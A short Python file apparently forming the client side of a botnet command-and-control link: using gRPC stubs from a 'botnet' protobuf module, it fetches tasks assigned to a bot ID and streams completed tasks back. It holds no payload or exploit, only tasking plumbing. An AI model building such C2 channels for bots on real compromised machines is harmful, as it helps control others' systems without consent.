from protos.botnet_pb2 import *
from protos.botnet_pb2_grpc import *

def get_tasks(client, id, tasks):
    for task in client.GetTasksBot(BotId(bot_id=id)):
        tasks.append(task)
    return tasks

def send_tasks(client, tasks):
    iterator = iter(tasks)
    client.SendStreamComplete(iterator)